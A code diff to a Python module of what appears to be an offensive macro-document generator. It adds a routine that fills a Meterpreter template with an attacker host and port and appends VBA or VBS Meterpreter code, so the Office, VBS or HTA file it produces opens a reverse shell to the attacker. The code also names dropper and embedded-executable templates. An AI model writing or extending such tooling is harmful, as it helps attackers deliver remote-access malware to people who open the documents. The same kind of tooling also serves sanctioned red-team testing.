@@ -6,9 +6,12 @@ import shlex
 import os
 import logging
 from modules.mp_module import MpModule
-from common import templates, utils
+import vbLib.Meterpreter
+from vbLib import templates
+from common import  utils
 import base64
 from common.utils import MSTypes
+
 
 
 class TemplateToVba(MpModule):
@@ -239,6 +242,31 @@ class TemplateToVba(MpModule):
         logging.info("   [-] OK!")
     
     
+    def _processMeterpreterTemplate(self):
+        """ Generate meterpreter template for VBA and VBS based """
+        # open file containing template values       
+        cmdFile = self.getCMDFile()
+        if cmdFile is None or cmdFile == "":
+            logging.error("   [!] Could not find template parameters!")
+            return
+        f = open(cmdFile, 'r')
+        valuesFileContent = f.read()
+        f.close()
+        params = shlex.split(valuesFileContent)# split on space but preserve what is between quotes
+        rhost = params[0]
+        rport = params[1] 
+        content = templates.METERPRETER
+        content = content.replace("<<<RHOST>>>", rhost)
+        content = content.replace("<<<RPORT>>>", rport)
+        if self.outputFileType in [MSTypes.HTA, MSTypes.VBS]:
+            content = content + vbLib.Meterpreter.VBS
+        else:
+            content = content + vbLib.Meterpreter.VBA
+        vbaFile = self.addVBAModule(content)
+        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        
+        
+    
     def run(self):
         logging.info(" [+] Generating VBA document from template...")
         if self.template is None:
@@ -254,7 +282,8 @@ class TemplateToVba(MpModule):
         elif self.template == "DROPPER_PS":
             content = templates.DROPPER_PS
         elif self.template == "METERPRETER":
-            content = templates.METERPRETER
+            self._processMeterpreterTemplate()
+            return
         elif self.template == "CMD":
             content = templates.CMD
         elif self.template == "EMBED_EXE":
